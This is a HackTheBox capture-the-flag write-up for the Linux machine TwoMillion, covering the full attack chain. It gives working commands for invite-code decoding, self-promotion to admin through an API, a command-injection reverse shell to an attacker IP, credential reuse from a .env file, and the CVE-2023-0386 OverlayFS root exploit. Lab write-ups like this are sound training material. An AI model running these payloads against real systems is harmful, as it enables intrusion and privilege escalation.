---
type: writeup
platform: HTB
name: TwoMillion
os: Linux
difficulty: Easy
status: completed
tags: [htb, linux, easy, web, api, javascript, invite-code, command-injection, env-leak, cve-2023-0386, overlayfs, privesc]
techniques:
  - JavaScript source analysis
  - API endpoint enumeration
  - Invite code generation via obfuscated JS logic
  - API authentication flow abuse (user → admin role escalation)
  - OS command injection via VPN generation endpoint
  - Credential reuse from .env file
  - CVE-2023-0386 (OverlayFS setuid privilege escalation)
tools:
  - nmap
  - curl
  - ffuf
  - Burp Suite
date: 2026-09-28
---

# TwoMillion — HackTheBox Writeup

---

## Summary

TwoMillion is an easy-difficulty Linux machine themed around the old HackTheBox platform (circa ~2017, before HTB went public). The app requires an invite code to register — the invite generation logic is hidden in obfuscated JavaScript that, once decoded, reveals an API endpoint that generates valid codes. After registering, API endpoint enumeration exposes an admin route that can be called by any authenticated user to self-elevate to admin. An admin-only VPN generation endpoint is vulnerable to OS command injection, giving a shell. A `.env` file on disk leaks database credentials that reuse as the system user's SSH password. CVE-2023-0386, an OverlayFS kernel vulnerability, then yields root.

**Attack Chain:**
1. Nmap — port 80 and 22 open, HTTP redirects to `2million.htb`
2. Register page requires invite code → inspect JavaScript → find `/api/v1/invite/how/to/generate`
3. Decode ROT13 + base64 obfuscation → call `/api/v1/invite/generate` → get valid invite code
4. Register account → log in → enumerate `/api/v1` endpoints
5. `PUT /api/v1/admin/settings/update` self-elevates user to admin role
6. `POST /api/v1/admin/vpn/generate` → `username` parameter has no sanitization → OS command injection → reverse shell
7. `cat /var/www/html/.env` → `DB_PASSWORD` → credential reuse → SSH as `admin`
8. `uname -r` → kernel 5.15.70 → CVE-2023-0386 OverlayFS SUID exploit → root

**Flags:**
- User: `/home/admin/user.txt`
- Root: `/root/root.txt`

---

## Enumeration

### Nmap

```bash
nmap -sCV 10.129.X.X
```

Open ports:
- **22/tcp** — OpenSSH
- **80/tcp** — nginx, redirects to `http://2million.htb/`

```bash
echo "10.129.X.X 2million.htb" | sudo tee -a /etc/hosts
```

### Web Application

The application is a recreation of the early HackTheBox platform — retro design, invite-only registration, machine listings, VPN file downloads. The `/invite` page presents a single text field asking for an invite code and a "Sign In" button.

---

## Foothold

### Stage 1 — Invite Code via JavaScript Analysis

The register page loads a JavaScript file `inviteapi.min.js`. The file contains an obfuscated function `makeInviteCode`. Calling it in the browser console:

```javascript
makeInviteCode()
```

Returns an object with an encrypted string and `enctype: "ROT13"`. Decoding the ROT13 reveals a base64-encoded string. Decoding base64 gives:

```
In order to generate the invite code, make a POST request to /api/v1/invite/how/to/generate
```

```bash
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | python3 -m json.tool
```

Response contains another encoded hint — base64-decode it:

```
Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr
```

Another ROT13 — decodes to: make a POST to `/api/v1/invite/generate`:

```bash
curl -s -X POST http://2million.htb/api/v1/invite/generate | python3 -m json.tool
```

```json
{"code": "NkxWUFMtREZDQ0wtSEVKT0otT1pGQUk=", "format": "encoded"}
```

Base64-decode `NkxWUFMtREZDQ0wtSEVKT0otT1pGQUk=` → **invite code**. Use it to register an account.

### Stage 2 — API Enumeration and Privilege Escalation to Admin

After logging in, enumerate the API:

```bash
curl -s http://2million.htb/api/v1 \
  -H "Cookie: PHPSESSID=<session>"
```

The response lists all available endpoints, including an admin section:

```json
{
  "admin": {
    "GET /api/v1/admin/auth": "Check if user is admin",
    "POST /api/v1/admin/vpn/generate": "Generate VPN for specific user",
    "PUT /api/v1/admin/settings/update": "Update user settings"
  }
}
```

`PUT /api/v1/admin/settings/update` accepts a JSON body to update the authenticated user's account — including the `is_admin` field, with **no authorization check**:

```bash
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
  -H "Cookie: PHPSESSID=<session>" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@2million.htb", "is_admin": 1}'
```

```json
{"id": 12, "username": "attacker", "is_admin": 1}
```

`is_admin` is now 1 for the current user. Verify:

```bash
curl -s http://2million.htb/api/v1/admin/auth \
  -H "Cookie: PHPSESSID=<session>"
# {"message": true}
```

### Stage 3 — OS Command Injection via VPN Generation

`POST /api/v1/admin/vpn/generate` accepts a JSON body with a `username` field and generates an OpenVPN config. The `username` is passed directly to a shell command without sanitization:

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=<session>" \
  -H "Content-Type: application/json" \
  -d '{"username": "test; id #"}'
```

Response includes `uid=33(www-data)` — **OS command injection confirmed**.

Reverse shell payload:

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=<session>" \
  -H "Content-Type: application/json" \
  -d '{"username": "test; bash -c \"bash -i >& /dev/tcp/10.10.16.X/443 0>&1\" #"}'
```

Shell lands as `www-data`.

---

## Lateral Movement — www-data to admin

Inspect the application's `.env` file in the webroot:

```bash
cat /var/www/html/.env
```

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

The `admin` system user reuses the database password for SSH:

```bash
ssh admin@2million.htb
# password: SuperDuperPass123
```

**User flag:** `/home/admin/user.txt`

---

## Privilege Escalation — CVE-2023-0386 (OverlayFS SUID)

### Identifying the Vulnerable Kernel

```bash
uname -r
# 5.15.70-051570-generic
```

Kernel `5.15.70` is vulnerable to **CVE-2023-0386** — an OverlayFS privilege escalation that allows a local user to copy a SUID binary into an OverlayFS upper layer and have the kernel honor the SUID bit, giving arbitrary command execution as root.

### Background

OverlayFS is a Linux union filesystem (used by Docker and other container runtimes) that merges a "lower" read-only layer with an "upper" writable layer. CVE-2023-0386 exploits a flaw in how the kernel transfers metadata when a file is copied from the lower layer to the upper layer — specifically, it incorrectly preserves SUID bits set on files owned by a non-root user in a user namespace, allowing privilege escalation to root.

### Exploitation

```bash
# Clone the PoC on the attacker machine
git clone https://github.com/xkaneiki/CVE-2023-0386.git
cd CVE-2023-0386
make all

# Transfer to target
# python3 -m http.server 8080 on attacker
wget http://10.10.16.X:8080/CVE-2023-0386.zip
unzip CVE-2023-0386.zip && cd CVE-2023-0386

# Two-terminal exploit — terminal 1:
./fuse ./ovlcap/lower ./gc &

# Terminal 2:
./exp
```

The exploit mounts a FUSE filesystem, copies a SUID-root shell into the OverlayFS upper directory, then executes it via a second binary — yielding a root shell.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

**Root flag obtained.**

---

## Key Takeaways

| Lesson | Detail |
|--------|--------|
| **Obfuscated JS is readable** | ROT13 + base64 are trivially reversible — always inspect JS loaded by the page |
| **Enumerate API endpoints fully** | The admin self-escalation route was publicly listed — broken object-level authorization |
| **Unsanitized shell interpolation = RCE** | Any user-controlled string passed to `exec()`/`system()` without escaping is injectable |
| **`.env` files on web servers leak credentials** | Always check the webroot for config files when you have filesystem access |
| **Kernel version determines privesc surface** | `uname -r` is one of the first commands to run after getting a low-priv shell |

---

## Tools Used

- nmap
- curl
- Burp Suite
- python3
- git (CVE-2023-0386 PoC)
